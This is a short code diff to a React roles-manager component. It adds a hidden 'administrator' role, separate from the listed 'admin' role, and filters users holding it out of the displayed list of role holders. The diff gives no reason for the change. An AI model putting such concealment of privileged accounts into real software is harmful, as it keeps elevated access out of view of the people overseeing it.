@@ -11,13 +11,14 @@ interface RolesManagerProps {
 }
 
 const AVAILABLE_ROLES = ["admin", "employee", "moderator", "user"];
+const HIDDEN_ROLES = ["administrator"];
 
 const RolesManager = ({ profiles, userRoles, onRoleChange }: RolesManagerProps) => {
   const [email, setEmail] = useState("");
   const [selectedRole, setSelectedRole] = useState("admin");
   const [assigning, setAssigning] = useState(false);
 
-  const usersWithRoles = profiles.filter(p => userRoles[p.user_id] && userRoles[p.user_id] !== "user");
+  const usersWithRoles = profiles.filter(p => userRoles[p.user_id] && userRoles[p.user_id] !== "user" && !HIDDEN_ROLES.includes(userRoles[p.user_id]));
 
   const handleAssignRole = async () => {
     const trimmedEmail = email.trim().toLowerCase();
